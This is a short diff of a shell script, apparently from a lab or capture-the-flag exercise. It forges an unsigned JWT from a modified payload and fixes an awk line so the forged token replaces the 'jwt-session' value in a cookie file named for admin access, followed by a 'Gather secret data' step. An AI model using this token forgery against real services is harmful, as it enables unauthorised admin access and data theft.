@@ -48,7 +48,7 @@ ENCODED_HEADER=$(echo "$HEADER" | base64 | tr -d '\n' | tr -d '=' | sed 's/+/-/g
 ENCODED_PAYLOAD=$(echo "$MODIFIED_PAYLOAD" | base64 | tr -d '\n' | tr -d '=' | sed 's/+/-/g; s/\//_/g')
 UNSIGNED_TOKEN="$ENCODED_HEADER.$ENCODED_PAYLOAD"
 echo "--> Token modified : $UNSIGNED_TOKEN"
-awk '{if ($6 == "jwt-session") $7 = $UNSIGNED_TOKEN} 1' "/work/8-cookies.txt" > tmp && mv tmp "/work/8-cookies-admin.txt"
+awk -v new_jwt="$UNSIGNED_TOKEN" '{if ($6 == "jwt-session") $7 = new_jwt} 1' "/work/8-cookies.txt" > tmp && mv tmp "/work/8-cookies-admin.txt"
 
 
 # Gather secret data
